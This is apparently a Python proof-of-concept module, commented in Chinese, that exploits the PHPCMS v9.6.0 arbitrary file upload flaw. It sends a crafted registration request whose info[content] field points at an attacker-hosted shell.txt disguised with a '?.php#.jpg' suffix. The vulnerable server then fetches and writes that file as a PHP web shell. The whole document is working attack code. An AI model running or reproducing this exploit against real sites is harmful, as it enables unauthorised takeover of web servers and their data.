# coding: utf-8
import requests

#phpcms v9.6.0任意文件上传漏洞
def poc(url,user_agent,proxy):

    url = url.strip("/")
    exp_url = url  + '/index.php?m=member&c=index&a=register&siteid=1'
    header = {'User-Agent': user_agent}

    shellurl=''
    select="N"
    select=input("# 使用phpcmsv9.6.0任意文件上传漏洞POC 需要一个包含shell.txt的url,这个url需要能在公网访问,是否输入url判断（N|y）：")
    if select.lower()=='y':
        shellurl=input("shell url<<< ")
        data={
            'siteid':1,
            'modelid':10,
            'username':'abc',
            'password':'123456',
            'pwdconfirm':'123456',
            'email':'123456@qq.com',
            'nickname':'abc',
            'info[content]':'<img src='+shellurl+'?.php#.jpg>',
            'dosubmit':'%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C',
            'protocol':''
        }
        try:
            if proxy:
                proxies = {
                    "http": "http://%(proxy)s/" % {'proxy': proxy},
                    "https": "http://%(proxy)s/" % {'proxy': proxy}
                }
                response = requests.post(exp_url, headers=header,data=data, proxies=proxies)
            else:
                response = requests.post(exp_url, headers=header,data=data)
        except Exception as error:
            pass

        if 'MySQL Query' in response.text and response.status_code==200:
            return 'phpcms v9.6.0 - 任意文件上传漏洞'


def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result

